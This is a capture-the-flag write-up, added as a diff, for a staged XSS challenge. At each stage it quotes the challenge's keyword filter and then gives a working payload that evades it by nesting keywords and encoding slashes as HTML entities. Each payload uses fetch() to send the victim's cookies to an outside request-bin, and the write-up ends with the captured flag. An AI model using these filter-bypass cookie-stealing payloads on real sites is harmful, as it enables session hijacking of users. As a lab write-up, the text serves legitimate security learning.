@@ -1,0 +1,80 @@
+Basic-XSS:
+```html
+<script>fetch('https://eop9gtez520d7u0.m.pipedream.net/'+document.cookie)</script>
+```
+
+What request-bin returns:
+```sh
+xss2=/bf2a73106a3aa48bab9b8b47e4bd350e
+```
+
+## Filter of second Stage:
+```py
+def filter_2(payload):
+    return payload.lower().replace("script", "").replace("img", "").replace("svg", "")
+```
+
+Using this payload
+```html
+<scrscriptipt>fetch('https://eop9gtez520d7u0.m.pipedream.net/'+document.cookie)</scrscriptipt>
+```
+
+Essentially in the payload `<scrscriptipt>` script will be removed and what remains is `<script>`
+```sh
+xss3=/3e79c8a64bd10f5fa897b7832384f043
+```
+
+## Filter of third Stage:
+```py
+def filter_3(payload):
+    if "://" in payload.lower():
+return "Nope"
+    if "document" in payload.lower():
+return "Nope"
+    if "cookie" in payload.lower():
+return "Nope"
+    return payload.lower().replace("script", "").replace("img", "").replace("svg", "")
+```
+
+In here we can use the `replace` options which are only cut out at the end and put `script` between `:script//` using this the `URL` will still be valid and the filter won't detect it. 
+
+```html
+<scrscriptipt>fetch('https:script//eop9gtez520d7u0.m.pipedream.net/'+docscriptument.coscriptokie)</scrscriptipt>
+```
+
+Request-Bin Return:
+```sh
+xss4=/f40e749b80cff27f8e726b2a95740dd6
+```
+
+
+## Filter of fourth Stage:
+
+```py
+def filter_4(payload):
+    if any(c in payload for c in '+"/'):
+return "Nope"
+    if "://" in payload.lower():
+return "Nope"
+    if "document" in payload.lower():
+return "Nope"
+    if "cookie" in payload.lower():
+return "Nope"
+    return payload.replace("script", "").replace("img", "").replace("svg", "")
+```
+
+`+` and `"` can easily be exchanged using the `javascript` syntax below. 
+```js
+`https://URL/${document.cookie}`
+```
+
+Good [article](https://www.doyler.net/security-not-included/xss-without-slashes)
+
+Final payload using html entity code characters instead of `/`:
+```html
+<iimgmg src=1 onerror='fetch(`https:script&#x2f;&#x2f;&#x2f;&#x2f;eop9gtez520d7u0.m.pipedream.net&#x2f;&#x2f;${docscriptument.coscriptokie}`)' >
+```
+
+```sh
+/flag=N0PS%7BcR05s_S1t3_Pr0_5cR1pT1nG%7D # URL-Decoded = N0PS{cR05s_S1t3_Pr0_5cR1pT1nG}
+```
